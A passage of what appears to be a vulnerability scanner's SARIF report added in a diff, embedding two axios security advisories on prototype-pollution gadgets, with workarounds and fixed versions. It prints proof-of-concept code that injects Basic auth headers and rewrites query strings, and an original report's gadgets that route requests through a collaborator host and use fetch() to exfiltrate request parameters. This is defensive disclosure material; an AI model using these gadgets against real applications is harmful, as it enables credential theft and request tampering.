not leak prototype state.');\n    console.log('  authLeaked   =', authLeaked);\n    console.log('  urlRewritten =', urlRewritten);\n    process.exitCode = 1;\n  }\n} finally {\n  server.close();\n  // Restore Object.prototype so a noisy exit/process state cannot affect\n  // anything else accidentally sharing the runtime.\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\n### Impact\nConcrete consequences:\n- Silent injection of attacker-controlled Authorization: Basic … headers on outbound requests, enabling credential exfiltration to attacker-chosen upstreams or impersonation against trusted upstreams.\n- Full takeover of query-string serialization via paramsSerializer.serialize, enabling request tampering, cache-key poisoning, and bypass of upstream signature/policy checks that sign the literal request line.\n<details>"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/advisories/GHSA-7q8q-rj6j-mhjq",
+              "help": {
+                "text": "Vulnerability GHSA-7q8q-rj6j-mhjq\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 0.33.0, 1.18.0\nLink: [GHSA-7q8q-rj6j-mhjq](https://github.com/advisories/GHSA-7q8q-rj6j-mhjq)\n## Summary\n\nAxios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted `Object.prototype`.\n\nThe top-level merged config is protected with a null prototype, but nested plain objects such as `auth` and `paramsSerializer` are cloned into ordinary objects. If application code passes placeholders such as `auth: {}` or `paramsSerializer: {}`, inherited `username`, `password`, `encode`, or `serialize` properties can influence outbound requests.\n\n## Impact\n\nThis is reachable only when another component has already polluted `Object.prototype` and the application passes an affected nested axios option object.\n\nConfirmed impacts include silent injection of an `Authorization: Basic ...` header from inherited `username` and `password` values, and query-string tampering when inherited `paramsSerializer` fields are function-valued.\n\nThe `auth` case requires only string-valued pollution. Full query-string replacement through `paramsSerializer.serialize` requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through `encode`.\n\nThis does not mean every axios request is affected. Requests that do not pass `auth`, do not pass `paramsSerializer`, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.\n\n## Affected Functionality\n\nAffected runtime functionality:\n\n- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.\n- Browser/fetch/XHR Basic auth handling through `lib/helpers/resolveConfig.js`.\n- Query serialization through `lib/helpers/buildURL.js`.\n- `axios.getUri()` when called with an affected `paramsSerializer` object.\n\nAffected config shapes:\n\n- `auth: {}` or an `auth` object missing own `username` and/or `password`.\n- `paramsSerializer: {}` or a `paramsSerializer` object missing own `encode` and/or `serialize`.\n\nUnaffected by this specific issue:\n\n- Requests with no `auth` property.\n- Requests with no `paramsSerializer` property.\n- Top-level polluted `auth` or `paramsSerializer` values in current hardened versions.\n\n## Technical Details\n\n`lib/core/mergeConfig.js` creates the top-level merged config with `Object.create(null)`, but nested object cloning still uses ordinary `{}` containers:\n\n```js\n} else if (utils.isPlainObject(source)) {\n  return utils.merge({}, source);\n}\n```\n\nDownstream code then reads nested fields without own-property checks.\n\nIn `lib/helpers/resolveConfig.js`:\n\n```js\nbtoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n```\n\nIn `lib/adapters/http.js`:\n\n```js\nconst username = configAuth.username || '';\nconst password = configAuth.password || '';\nauth = username + ':' + password;\n```\n\nIn `lib/helpers/buildURL.js`:\n\n```js\nconst _encode = (options && options.encode) || encode;\nconst serializeFn = _options && _options.serialize;\n```\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'node:http';\nimport axios from './index.js';\n\nconst user = 'attacker';\nconst pass = 'exfil';\n\nObject.defineProperty(Object.prototype, 'username', {\n  value: user,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'password', {\n  value: pass,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true\n});\n\nconst server = http.createServer((req, res) => {\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify({\n    authorization: req.headers.authorization || null,\n    url: req.url\n  }));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\n\ntry {\n  const port = server.address().port;\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored' }\n  });\n\n  console.log(response.data);\n} finally {\n  await new Promise((resolve) => server.close(resolve));\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\nObserved result:\n\n```json\n{\n  \"authorization\": \"Basic YXR0YWNrZXI6ZXhmaWw=\",\n  \"url\": \"/demo?polluted=1\"\n}\n```\n\n## Workarounds\n\nIf upgrading is not yet possible, avoid passing placeholder nested option objects.\n\nRemove `auth` entirely when Basic auth is not intended. For `paramsSerializer` objects, provide explicit own `encode` and `serialize` properties or remove `paramsSerializer` when custom serialization is not required.\n\nThese workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\naxios 1.16.1 mitigates prototype-pollution gadgets on the top-level request config but not on nested option objects. When a caller passes a partial nested option object such as auth: {} or paramsSerializer: {}, axios reads inner fields (username, password, encode, serialize) through the prototype chain. If Object.prototype has been polluted by another component in the same Node.js process, those inherited values are silently injected into the outbound request, including the Authorization header and the serialized query string. \n\n### Details\nmergeConfig (lib/core/mergeConfig.js) was hardened to use a null-prototype container for the top-level config, but its nested-clone helper still produces ordinary {} containers:\n\nmergeConfig.js Lines 36-45\n\n```\n  function getMergedValue(target, source, prop, caseless) {\n    if (utils.isPlainObject(target) && utils.isPlainObject(source)) {\n      return utils.merge.call({ caseless }, target, source);\n    } else if (utils.isPlainObject(source)) {\n      return utils.merge({}, source);\n    } else if (utils.isArray(source)) {\n      return source.slice();\n    }\n    return source;\n  }\n```\n\nThe cloned nested objects therefore inherit from Object.prototype. Downstream consumers read sensitive fields via plain dotted access, with no own-property guard:\n\nBrowser / fetch Basic auth — lib/helpers/resolveConfig.js:\nresolveConfig.js Lines 64-70\n```\n  if (auth) {\n    headers.set(\n      'Authorization',\n      'Basic ' +\n        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n    );\n  }\n```\n\nNode HTTP adapter Basic auth — lib/adapters/http.js:\nhttp.js Lines 829-836\n```\n      // HTTP basic authentication\n      let auth = undefined;\n      const configAuth = own('auth');\n      if (configAuth) {\n        const username = configAuth.username || '';\n        const password = configAuth.password || '';\n        auth = username + ':' + password;\n      }\n```\n\nparamsSerializer reads — lib/helpers/buildURL.js:\nbuildURL.js Lines 31-54\n```\nexport default function buildURL(url, params, options) {\n  if (!params) {\n    return url;\n  }\n  const _encode = (options && options.encode) || encode;\n  const _options = utils.isFunction(options)\n    ? {\n        serialize: options,\n      }\n    : options;\n  const serializeFn = _options && _options.serialize;\n  let serializedParams;\n  if (serializeFn) {\n    serializedParams = serializeFn(params, _options);\n  } else {\n    serializedParams = utils.isURLSearchParams(params)\n      ? params.toString()\n      : new AxiosURLSearchParams(params, _options).toString(_encode);\n  }\n```\n\nBecause auth.username, auth.password, options.encode, and options.serialize are accessed without hasOwnProperty checks, a polluted Object.prototype.username / Object.prototype.password / Object.prototype.serialize flows directly into the outgoing request.\n\nThe auth sink is the primary impact (silent Basic-auth injection); paramsSerializer.serialize is a secondary but powerful sink because it can fully replace the query string.\n\n### PoC\n```\nimport http from 'node:http';\nimport axios from '../../index.js';\n\nconst ATTACKER_USER = 'attacker';\nconst ATTACKER_PASS = 'exfil';\nconst ATTACKER_BASIC = Buffer.from(`${ATTACKER_USER}:${ATTACKER_PASS}`).toString('base64');\n\n// Step 1: simulate a pre-existing prototype-pollution primitive in this process.\n// In reality, a separate dependency would have done this. We keep the\n// \"polluted\" properties non-enumerable so they only affect inherited reads,\n// which is the realistic shape of most prototype-pollution gadgets.\nObject.defineProperty(Object.prototype, 'username', {\n  value: ATTACKER_USER,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'password', {\n  value: ATTACKER_PASS,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true,\n});\n\n// Local capture server.\nconst server = http.createServer((req, res) => {\n  const captured = {\n    authorization: req.headers['authorization'] || null,\n    url: req.url,\n  };\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify(captured));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\nconst port = server.address().port;\n\ntry {\n  // Application code: passes nested *placeholder* option objects that have\n  // no own auth/serializer properties. Without prototype pollution this is\n  // a no-op. With prototype pollution it becomes attacker-controlled state.\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored-by-polluted-serializer' },\n  });\n\n  console.log('--- PoC: nested-option prototype-pollution gadgets ---');\n  console.log('Server saw:', JSON.stringify(response.data));\n\n  const authLeaked = response.data.authorization === `Basic ${ATTACKER_BASIC}`;\n  const urlRewritten = response.data.url === '/demo?polluted=1';\n\n  if (authLeaked && urlRewritten) {\n    console.log(\n      'VULNERABLE: nested auth + paramsSerializer inherited polluted ' +\n        'Object.prototype values into the outbound request.'\n    );\n    process.exitCode = 0;\n  } else {\n    console.log('NOT VULNERABLE: nested option objects did not leak prototype state.');\n    console.log('  authLeaked   =', authLeaked);\n    console.log('  urlRewritten =', urlRewritten);\n    process.exitCode = 1;\n  }\n} finally {\n  server.close();\n  // Restore Object.prototype so a noisy exit/process state cannot affect\n  // anything else accidentally sharing the runtime.\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\n### Impact\nConcrete consequences:\n- Silent injection of attacker-controlled Authorization: Basic … headers on outbound requests, enabling credential exfiltration to attacker-chosen upstreams or impersonation against trusted upstreams.\n- Full takeover of query-string serialization via paramsSerializer.serialize, enabling request tampering, cache-key poisoning, and bypass of upstream signature/policy checks that sign the literal request line.\n<details>",
+                "markdown": "**Vulnerability GHSA-7q8q-rj6j-mhjq**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|0.33.0, 1.18.0|[GHSA-7q8q-rj6j-mhjq](https://github.com/advisories/GHSA-7q8q-rj6j-mhjq)|\n\n## Summary\n\nAxios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted `Object.prototype`.\n\nThe top-level merged config is protected with a null prototype, but nested plain objects such as `auth` and `paramsSerializer` are cloned into ordinary objects. If application code passes placeholders such as `auth: {}` or `paramsSerializer: {}`, inherited `username`, `password`, `encode`, or `serialize` properties can influence outbound requests.\n\n## Impact\n\nThis is reachable only when another component has already polluted `Object.prototype` and the application passes an affected nested axios option object.\n\nConfirmed impacts include silent injection of an `Authorization: Basic ...` header from inherited `username` and `password` values, and query-string tampering when inherited `paramsSerializer` fields are function-valued.\n\nThe `auth` case requires only string-valued pollution. Full query-string replacement through `paramsSerializer.serialize` requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through `encode`.\n\nThis does not mean every axios request is affected. Requests that do not pass `auth`, do not pass `paramsSerializer`, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.\n\n## Affected Functionality\n\nAffected runtime functionality:\n\n- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.\n- Browser/fetch/XHR Basic auth handling through `lib/helpers/resolveConfig.js`.\n- Query serialization through `lib/helpers/buildURL.js`.\n- `axios.getUri()` when called with an affected `paramsSerializer` object.\n\nAffected config shapes:\n\n- `auth: {}` or an `auth` object missing own `username` and/or `password`.\n- `paramsSerializer: {}` or a `paramsSerializer` object missing own `encode` and/or `serialize`.\n\nUnaffected by this specific issue:\n\n- Requests with no `auth` property.\n- Requests with no `paramsSerializer` property.\n- Top-level polluted `auth` or `paramsSerializer` values in current hardened versions.\n\n## Technical Details\n\n`lib/core/mergeConfig.js` creates the top-level merged config with `Object.create(null)`, but nested object cloning still uses ordinary `{}` containers:\n\n```js\n} else if (utils.isPlainObject(source)) {\n  return utils.merge({}, source);\n}\n```\n\nDownstream code then reads nested fields without own-property checks.\n\nIn `lib/helpers/resolveConfig.js`:\n\n```js\nbtoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n```\n\nIn `lib/adapters/http.js`:\n\n```js\nconst username = configAuth.username || '';\nconst password = configAuth.password || '';\nauth = username + ':' + password;\n```\n\nIn `lib/helpers/buildURL.js`:\n\n```js\nconst _encode = (options && options.encode) || encode;\nconst serializeFn = _options && _options.serialize;\n```\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'node:http';\nimport axios from './index.js';\n\nconst user = 'attacker';\nconst pass = 'exfil';\n\nObject.defineProperty(Object.prototype, 'username', {\n  value: user,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'password', {\n  value: pass,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true\n});\n\nconst server = http.createServer((req, res) => {\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify({\n    authorization: req.headers.authorization || null,\n    url: req.url\n  }));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\n\ntry {\n  const port = server.address().port;\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored' }\n  });\n\n  console.log(response.data);\n} finally {\n  await new Promise((resolve) => server.close(resolve));\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\nObserved result:\n\n```json\n{\n  \"authorization\": \"Basic YXR0YWNrZXI6ZXhmaWw=\",\n  \"url\": \"/demo?polluted=1\"\n}\n```\n\n## Workarounds\n\nIf upgrading is not yet possible, avoid passing placeholder nested option objects.\n\nRemove `auth` entirely when Basic auth is not intended. For `paramsSerializer` objects, provide explicit own `encode` and `serialize` properties or remove `paramsSerializer` when custom serialization is not required.\n\nThese workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\naxios 1.16.1 mitigates prototype-pollution gadgets on the top-level request config but not on nested option objects. When a caller passes a partial nested option object such as auth: {} or paramsSerializer: {}, axios reads inner fields (username, password, encode, serialize) through the prototype chain. If Object.prototype has been polluted by another component in the same Node.js process, those inherited values are silently injected into the outbound request, including the Authorization header and the serialized query string. \n\n### Details\nmergeConfig (lib/core/mergeConfig.js) was hardened to use a null-prototype container for the top-level config, but its nested-clone helper still produces ordinary {} containers:\n\nmergeConfig.js Lines 36-45\n\n```\n  function getMergedValue(target, source, prop, caseless) {\n    if (utils.isPlainObject(target) && utils.isPlainObject(source)) {\n      return utils.merge.call({ caseless }, target, source);\n    } else if (utils.isPlainObject(source)) {\n      return utils.merge({}, source);\n    } else if (utils.isArray(source)) {\n      return source.slice();\n    }\n    return source;\n  }\n```\n\nThe cloned nested objects therefore inherit from Object.prototype. Downstream consumers read sensitive fields via plain dotted access, with no own-property guard:\n\nBrowser / fetch Basic auth — lib/helpers/resolveConfig.js:\nresolveConfig.js Lines 64-70\n```\n  if (auth) {\n    headers.set(\n      'Authorization',\n      'Basic ' +\n        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n    );\n  }\n```\n\nNode HTTP adapter Basic auth — lib/adapters/http.js:\nhttp.js Lines 829-836\n```\n      // HTTP basic authentication\n      let auth = undefined;\n      const configAuth = own('auth');\n      if (configAuth) {\n        const username = configAuth.username || '';\n        const password = configAuth.password || '';\n        auth = username + ':' + password;\n      }\n```\n\nparamsSerializer reads — lib/helpers/buildURL.js:\nbuildURL.js Lines 31-54\n```\nexport default function buildURL(url, params, options) {\n  if (!params) {\n    return url;\n  }\n  const _encode = (options && options.encode) || encode;\n  const _options = utils.isFunction(options)\n    ? {\n        serialize: options,\n      }\n    : options;\n  const serializeFn = _options && _options.serialize;\n  let serializedParams;\n  if (serializeFn) {\n    serializedParams = serializeFn(params, _options);\n  } else {\n    serializedParams = utils.isURLSearchParams(params)\n      ? params.toString()\n      : new AxiosURLSearchParams(params, _options).toString(_encode);\n  }\n```\n\nBecause auth.username, auth.password, options.encode, and options.serialize are accessed without hasOwnProperty checks, a polluted Object.prototype.username / Object.prototype.password / Object.prototype.serialize flows directly into the outgoing request.\n\nThe auth sink is the primary impact (silent Basic-auth injection); paramsSerializer.serialize is a secondary but powerful sink because it can fully replace the query string.\n\n### PoC\n```\nimport http from 'node:http';\nimport axios from '../../index.js';\n\nconst ATTACKER_USER = 'attacker';\nconst ATTACKER_PASS = 'exfil';\nconst ATTACKER_BASIC = Buffer.from(`${ATTACKER_USER}:${ATTACKER_PASS}`).toString('base64');\n\n// Step 1: simulate a pre-existing prototype-pollution primitive in this process.\n// In reality, a separate dependency would have done this. We keep the\n// \"polluted\" properties non-enumerable so they only affect inherited reads,\n// which is the realistic shape of most prototype-pollution gadgets.\nObject.defineProperty(Object.prototype, 'username', {\n  value: ATTACKER_USER,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'password', {\n  value: ATTACKER_PASS,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true,\n});\n\n// Local capture server.\nconst server = http.createServer((req, res) => {\n  const captured = {\n    authorization: req.headers['authorization'] || null,\n    url: req.url,\n  };\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify(captured));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\nconst port = server.address().port;\n\ntry {\n  // Application code: passes nested *placeholder* option objects that have\n  // no own auth/serializer properties. Without prototype pollution this is\n  // a no-op. With prototype pollution it becomes attacker-controlled state.\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored-by-polluted-serializer' },\n  });\n\n  console.log('--- PoC: nested-option prototype-pollution gadgets ---');\n  console.log('Server saw:', JSON.stringify(response.data));\n\n  const authLeaked = response.data.authorization === `Basic ${ATTACKER_BASIC}`;\n  const urlRewritten = response.data.url === '/demo?polluted=1';\n\n  if (authLeaked && urlRewritten) {\n    console.log(\n      'VULNERABLE: nested auth + paramsSerializer inherited polluted ' +\n        'Object.prototype values into the outbound request.'\n    );\n    process.exitCode = 0;\n  } else {\n    console.log('NOT VULNERABLE: nested option objects did not leak prototype state.');\n    console.log('  authLeaked   =', authLeaked);\n    console.log('  urlRewritten =', urlRewritten);\n    process.exitCode = 1;\n  }\n} finally {\n  server.close();\n  // Restore Object.prototype so a noisy exit/process state cannot affect\n  // anything else accidentally sharing the runtime.\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\n### Impact\nConcrete consequences:\n- Silent injection of attacker-controlled Authorization: Basic … headers on outbound requests, enabling credential exfiltration to attacker-chosen upstreams or impersonation against trusted upstreams.\n- Full takeover of query-string serialization via paramsSerializer.serialize, enabling request tampering, cache-key poisoning, and bypass of upstream signature/policy checks that sign the literal request line.\n<details>"
+              },
+              "properties": {
+                "cvssv40_baseScore": 6.3,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N",
+                "precision": "very-high",
+                "security-severity": "5.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-mmx7-hfxf-jppx",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Axios: Prototype pollution gadgets can alter axios request construction"
+              },
+              "fullDescription": {
+                "text": "## Summary\n\naxios is vulnerable to read-side prototype-pollution gadgets when `Object.prototype` has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: `axios.get()`, `axios.delete()`, `axios.head()`, and `axios.options()` read inherited `data` before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.\n\nAdditional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited `proxy` or `paramsSerializer` values can influence request routing or URL serialization. These low-level paths are not reproduced through normal `axios.get()` usage on `1.15.2+`.\n\n## Impact\n\nAn attacker who can first pollute `Object.prototype` can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on `GET`, `DELETE`, `HEAD`, or `OPTIONS`.\n\nFor direct low-level Node HTTP adapter usage, inherited `proxy` can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.\n\nFor direct `resolveConfig` or browser-adapter helper usage, inherited `paramsSerializer` can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on `1.15.2+`.\n\n## Affected Functionality\n\nAffected normal API:\n\n- `axios.get(url[, config])`\n- `axios.delete(url[, config])`\n- `axios.head(url[, config])`\n- `axios.options(url[, config])`\n\nAffected low-level usage:\n\n- Direct calls to `axios/lib/adapters/http.js` or `axios/unsafe/adapters/http.js` with plain configs and no own `proxy`.\n- Direct calls to `axios/unsafe/helpers/resolveConfig.js` or direct browser adapter/helper paths with plain configs and no own `paramsSerializer`.\n\nUnaffected or corrected scope:\n\n- Normal `axios.get()` calls on `1.15.2+` did not reproduce the `proxy` or `paramsSerializer` gadgets because `mergeConfig()` returns a null-prototype config and uses own-property reads.\n\n## Technical Details\n\n`lib/core/Axios.js` constructs aliases for bodyless methods and copies `data` with `(config || {}).data` before config normalization. If `Object.prototype.data` is polluted, this inherited value becomes an own `data` property in the merged request config and is sent by the adapter.\n\n`lib/core/mergeConfig.js` in `1.15.2+` returns a null-prototype config and uses `hasOwnProp` guards, which prevents normal high-level requests from inheriting polluted `proxy` and `paramsSerializer` values after merge. This is why those two reporter claims do not reproduce through normal `axios.get()` on `1.15.2` or `1.16.1`.\n\nThe low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of `config.proxy` in the Node HTTP adapter and `config.paramsSerializer` in affected `resolveConfig()` versions can consume inherited polluted values.\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'http';\nimport axios from 'axios';\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n\n  req.on('data', chunk => {\n    body += chunk;\n  });\n\n  req.on('end', () => {\n    res.writeHead(200, {'content-type': 'application/json'});\n    res.end(JSON.stringify({body, headers: req.headers}));\n  });\n});\n\nawait new Promise(resolve => server.listen(0, '127.0.0.1', resolve));\n\nObject.prototype.data = 'INJECTED';\n\ntry {\n  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);\n\n  console.log(res.data.body); // \"INJECTED\"\n  console.log(res.data.headers['content-length']); // \"8\"\n} finally {\n  delete Object.prototype.data;\n  await new Promise(resolve => server.close(resolve));\n}\n```\n\nExpected result: a request body is sent even though the caller did not explicitly set `config.data`.\n\n## Workarounds\n\nAvoid processing untrusted input with libraries or code paths that can pollute `Object.prototype`. As a defense-in-depth mitigation before an axios fix is available, explicitly pass `data: undefined` on bodyless method aliases when running in a process where prototype pollution is a concern.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\n\nThree prototype pollution read-side gadgets in axios bypass the `own()` hasOwnProp guard pattern, allowing a polluted `Object.prototype` to hijack outbound requests.\n\n### Details\n\nThe [`own()` helper](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L342) was introduced after GHSA-q8qp-cvcw-x6jj to prevent polluted prototype properties from reaching security-sensitive config reads. Three paths were missed:\n\n`config.proxy` at [http.js:715](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L715) goes straight into [`setProxy()`](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L197). A polluted `Object.prototype.proxy` reroutes outbound requests through an attacker-controlled proxy, exposing Authorization headers and full request URLs.\n\n`(config || {}).data` at [Axios.js:248](https://github.com/axios/axios/blob/v1.15.2/lib/core/Axios.js#L248) covers GET, HEAD, DELETE, OPTIONS. Even without explicit body, polluted value becomes the body. I got injected payloads on 3 of 4 method types in testing.\n\n`config.paramsSerializer` at [resolveConfig.js:32](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L32) is three lines below the [`own()` definition that was supposed to protect it](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L15). A polluted  function onto `Object.prototype.paramsSerializer` gets called with the request params on every request that has query strings.\n\nI read up on the threat model and I believe T-R4b identifies this exact class and notes that config-read paths must use `hasOwnProp` guards. These three seem to predate or were missed by that coverage.\n\n### PoC\n\nRan against `axios@1.15.2` on `node:22-slim` in Docker. Clean install, no other deps.\n\n```javascript\nimport axios from 'axios';\n\n// gadget 1 - proxy\nObject.prototype.proxy = { host: 'yourcollab.oastify.com', port: 8080, protocol: 'http' };\nawait axios.get('https://api.example.com/user', { headers: { Authorization: 'Bearer sk-test-1234567890' } });\n// check collaborator - request arrives with full path + auth header\n```\n\n```javascript\n// gadget 2 - data on bodyless methods\nObject.prototype.data = '{\"injected\":true}';\nawait axios.get('https://api.example.com/items');\nawait axios.delete('https://api.example.com/items/1');\nawait axios.head('https://api.example.com/items');\n// 3/4 methods send the polluted body\n```\n\n```javascript\n// gadget 3 - paramsSerializer\nObject.prototype.paramsSerializer = (p) => {\n  fetch('https://yourcollab.oastify.com/?' + new URLSearchParams(p));\n  return 'q=x';\n};\nawait axios.get('https://api.example.com/search', { params: { token: 'secret' } });\n```\n\n### Impact\n\nAny app with a polluted prototype (common via transitive deps like lodash, qs, minimist) should be affected. Gadget 1 steals credentials and redirects traffic. Gadget 2 corrupts request semantics. Gadget 3 gives the attacker arbitrary control over URL construction and a data exfiltration channel. All three fire silently on normal application code that never touches proxy, data, or `paramsSerializer` directly.\n</details>"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/advisories/GHSA-mmx7-hfxf-jppx",
+              "help": {
+                "text": "Vulnerability GHSA-mmx7-hfxf-jppx\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.18.0, 0.33.0\nLink: [GHSA-mmx7-hfxf-jppx](https://github.com/advisories/GHSA-mmx7-hfxf-jppx)\n## Summary\n\naxios is vulnerable to read-side prototype-pollution gadgets when `Object.prototype` has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: `axios.get()`, `axios.delete()`, `axios.head()`, and `axios.options()` read inherited `data` before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.\n\nAdditional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited `proxy` or `paramsSerializer` values can influence request routing or URL serialization. These low-level paths are not reproduced through normal `axios.get()` usage on `1.15.2+`.\n\n## Impact\n\nAn attacker who can first pollute `Object.prototype` can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on `GET`, `DELETE`, `HEAD`, or `OPTIONS`.\n\nFor direct low-level Node HTTP adapter usage, inherited `proxy` can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.\n\nFor direct `resolveConfig` or browser-adapter helper usage, inherited `paramsSerializer` can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on `1.15.2+`.\n\n## Affected Functionality\n\nAffected normal API:\n\n- `axios.get(url[, config])`\n- `axios.delete(url[, config])`\n- `axios.head(url[, config])`\n- `axios.options(url[, config])`\n\nAffected low-level usage:\n\n- Direct calls to `axios/lib/adapters/http.js` or `axios/unsafe/adapters/http.js` with plain configs and no own `proxy`.\n- Direct calls to `axios/unsafe/helpers/resolveConfig.js` or direct browser adapter/helper paths with plain configs and no own `paramsSerializer`.\n\nUnaffected or corrected scope:\n\n- Normal `axios.get()` calls on `1.15.2+` did not reproduce the `proxy` or `paramsSerializer` gadgets because `mergeConfig()` returns a null-prototype config and uses own-property reads.\n\n## Technical Details\n\n`lib/core/Axios.js` constructs aliases for bodyless methods and copies `data` with `(config || {}).data` before config normalization. If `Object.prototype.data` is polluted, this inherited value becomes an own `data` property in the merged request config and is sent by the adapter.\n\n`lib/core/mergeConfig.js` in `1.15.2+` returns a null-prototype config and uses `hasOwnProp` guards, which prevents normal high-level requests from inheriting polluted `proxy` and `paramsSerializer` values after merge. This is why those two reporter claims do not reproduce through normal `axios.get()` on `1.15.2` or `1.16.1`.\n\nThe low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of `config.proxy` in the Node HTTP adapter and `config.paramsSerializer` in affected `resolveConfig()` versions can consume inherited polluted values.\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'http';\nimport axios from 'axios';\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n\n  req.on('data', chunk => {\n    body += chunk;\n  });\n\n  req.on('end', () => {\n    res.writeHead(200, {'content-type': 'application/json'});\n    res.end(JSON.stringify({body, headers: req.headers}));\n  });\n});\n\nawait new Promise(resolve => server.listen(0, '127.0.0.1', resolve));\n\nObject.prototype.data = 'INJECTED';\n\ntry {\n  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);\n\n  console.log(res.data.body); // \"INJECTED\"\n  console.log(res.data.headers['content-length']); // \"8\"\n} finally {\n  delete Object.prototype.data;\n  await new Promise(resolve => server.close(resolve));\n}\n```\n\nExpected result: a request body is sent even though the caller did not explicitly set `config.data`.\n\n## Workarounds\n\nAvoid processing untrusted input with libraries or code paths that can pollute `Object.prototype`. As a defense-in-depth mitigation before an axios fix is available, explicitly pass `data: undefined` on bodyless method aliases when running in a process where prototype pollution is a concern.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\n\nThree prototype pollution read-side gadgets in axios bypass the `own()` hasOwnProp guard pattern, allowing a polluted 